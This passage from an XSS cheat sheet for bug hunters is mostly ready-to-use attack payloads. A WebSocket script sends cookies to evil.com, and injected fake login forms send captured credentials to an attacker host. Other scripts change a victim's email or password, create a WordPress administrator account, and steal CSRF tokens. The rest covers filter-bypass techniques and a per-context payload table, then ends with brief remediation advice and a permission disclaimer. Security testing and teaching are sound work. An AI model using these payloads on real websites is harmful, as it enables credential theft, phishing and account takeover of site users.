  var ws = new WebSocket('ws://evil.com:8080');
  ws.onopen = function() {
    ws.send(document.cookie);
  };
</script>
```

---

## Phishing with XSS

### Iframe Injection for Phishing
```html
<!-- Full page phishing -->
<iframe src="http://evil.com/phishing.html" height="100%" width="100%" style="position:fixed;top:0;left:0;z-index:9999"></iframe>

<!-- Login form injection -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
  <h2>Session expired. Please login again.</h2>
  <form action="http://evil.com/steal">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" value="Login">
  </form>
</div>
```

### Fake Login Page Injection
```html
<script>
  document.body.innerHTML = `
    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
      <div style="width:300px;margin:100px auto">
        <h2>Please login to continue</h2>
        <form onsubmit="steal()">
          <input type="text" id="user" placeholder="Username">
          <input type="password" id="pass" placeholder="Password">
          <input type="submit" value="Login">
        </form>
      </div>
    </div>
  `;
  
  function steal() {
    var creds = document.getElementById('user').value + ':' + document.getElementById('pass').value;
    new Image().src = 'http://evil.com/steal?creds=' + btoa(creds);
  }
</script>
```

---

## XSS for Account Takeover

### Change Email/Password
```html
<!-- Change email with CSRF token extraction -->
<script>
  var csrf = document.querySelector('input[name="csrf"]').value;
  
  fetch('/change-email', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'csrf=' + csrf + '&email=hacker@evil.com'
  });
</script>

<!-- Change password -->
<script>
  fetch('/change-password', {
    method: 'POST',
    body: 'new_password=hacked123&confirm_password=hacked123'
  });
</script>
```

### Add Admin User (WordPress)
```html
<script>
  fetch('/wp-admin/user-new.php', {
    method: 'POST',
    body: 'action=createuser&user_login=hacker&email=hacker@evil.com&pass1=hacked123&pass2=hacked123&role=administrator'
  });
</script>
```

### Extract CSRF Token and Perform Action
```html
<script>
  var req = new XMLHttpRequest();
  req.onload = function() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/email/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com');
  };
  req.open('get','/email',true);
  req.send();
</script>
```

---

## Key Injection Points Checklist

### URL Parameters
- Search parameters (`?q=...`)
- Path parameters (`/user/...`)
- Fragment/hash (`#...`)
- Query string values

### Form Fields
- Text inputs
- Textareas
- Hidden fields
- Select options
- File names

### HTTP Headers
- User-Agent
- Referer
- X-Forwarded-For
- Cookie values
- Host header

### JavaScript Contexts
- Inside string literals
- Inside template literals
- Inside eval()
- Inside setTimeout/setInterval
- Inside Function constructor

### HTML Attributes
- src attribute
- href attribute
- on* event handlers
- style attribute
- data-* attributes

### Storage
- localStorage
- sessionStorage
- IndexedDB
- Cookies

### URL Components
- document.URL
- document.documentURI
- location.href
- location.search
- location.hash
- location.pathname
- document.referrer
- window.name

### DOM Properties
- innerHTML
- outerHTML
- document.write
- insertAdjacentHTML
- createContextualFragment

---

## Defensive Bypass Techniques Summary

### Character Encoding
- Unicode (`\u0061`, `&#x61;`, `&#97;`)
- Hex (`\x61`)
- URL (`%61`)
- Double URL (`%2561`)
- Base64 (`atob()`)

### Whitespace Variations
- Tab (`&#x09;`)
- Newline (`&#x0A;`)
- Carriage return (`&#x0D;`)
- Null byte (`%00`)

### Case Variations
- `<ScRiPt>`
- `<IMG>`
- `OnLoAd`

### Character Substitution
- `alert` → `\u0061lert`
- `javascript:` → `javaSCRIPT:`
- `onerror` → `onErRor`

### Comment Interruption
- `/* ... */`
- `//`
- `<!-- ... -->`
- `<!- ... ->`

### Null Byte Injection
- `%00`
- `\0`

### Parameter Pollution
- Duplicate parameters
- Array parameters (`?param[]=value`)
- Nested parameters

### Context Switching
- Break out of tags (`-->`, `}>`, `];`)
- Break out of strings (`'`, `"`, `` ` ``)
- Break out of comments (`--!>`, `*/`)

---

## Remediation Recommendations

### For Developers
1. **Always escape output** based on context (HTML, attribute, JS, CSS, URL)
2. **Use Content Security Policy (CSP)** headers
3. **Use HttpOnly and Secure flags** for cookies
4. **Validate and sanitize input** (but don't rely solely on this)
5. **Use framework-specific escaping** (React, Angular, Vue handle this automatically)
6. **Implement XSS filters** on WAF/CDN level
7. **Regular security testing** with automated tools

### For Bug Hunters
1. **Test all input vectors** (not just URL parameters)
2. **Try different contexts** (HTML, attribute, JS, CSS)
3. **Use encoding variations** to bypass filters
4. **Check blind XSS** opportunities
5. **Test file uploads** with malicious content
6. **Review JavaScript files** for DOM-based XSS
7. **Use automated tools** then manually verify

### Sample Secure Code Patterns
```php
// PHP - Use htmlspecialchars()
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// JavaScript - Use textContent instead of innerHTML
element.textContent = user_input;

// React - Automatically escapes by default
<div>{user_input}</div>  // Safe

// Angular - Automatically escapes by default
<div>{{user_input}}</div>  // Safe

// CSP Header
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'
```

---

## Quick Reference: When to Use Which Payload

| Context | Example Payload |
|---------|----------------|
| HTML Body | `<script>alert(1)</script>` |
| HTML Attribute (double-quoted) | `" onmouseover="alert(1)"` |
| HTML Attribute (single-quoted) | `' onmouseover='alert(1)'` |
| HTML Attribute (no quotes) | `onmouseover=alert(1)` |
| JavaScript String (double-quoted) | `"; alert(1);//` |
| JavaScript String (single-quoted) | `'; alert(1);//` |
| JavaScript Template | `${alert(1)}` |
| URL (href/src) | `javascript:alert(1)` |
| CSS (style) | `expression(alert(1))` |
| SVG | `<svg/onload=alert(1)>` |
| MathML | `<math><a xlink:href=javascript:alert(1)>` |
| XML | `<html:script>alert(1)</html:script>` |

---

*This comprehensive guide covers XSS from basic to advanced. Always ensure you have permission before testing on any website.*
